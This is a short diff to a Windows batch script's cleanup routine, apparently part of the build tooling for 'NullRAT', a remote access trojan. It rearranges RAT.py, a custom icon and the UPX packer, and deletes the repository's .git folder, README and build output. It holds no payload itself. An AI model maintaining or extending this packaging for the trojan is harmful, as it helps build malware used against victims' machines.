@@ -125,20 +125,21 @@ pause
 
 :cleanup
 cd "%~dp0"
+if exist "NullRAT\" (
+	move NullRAT\custom_icon.ico "%~dp0"
+	move NullRAT\RAT.py "%~dp0"
+	move NullRAT\upx\upx.exe "%~dp0"
+	rmdir /s /q NullRAT
+	
+	mkdir upx
+	move upx.exe upx\ 
+)
 attrib -h ".git"
 del README.md
 del "Getting Variables".md
 del .gitignore
 rmdir /s /q ".git"
-cd "%~dp0NullRAT"
-move upx\ "%~dp0"
-move custom_icon.ico "%~dp0"
-move RAT.py "%~dp0"
-cd "%~dp0"
-rmdir /s /q NullRAT
-mkdir NullRAT
-move RAT.py NullRAT\
-move custom_icon.ico NullRAT\
-move upx\ NullRAT
+rmdir /s /q "build"
+rmdir /s /q "dist"
 
 goto main
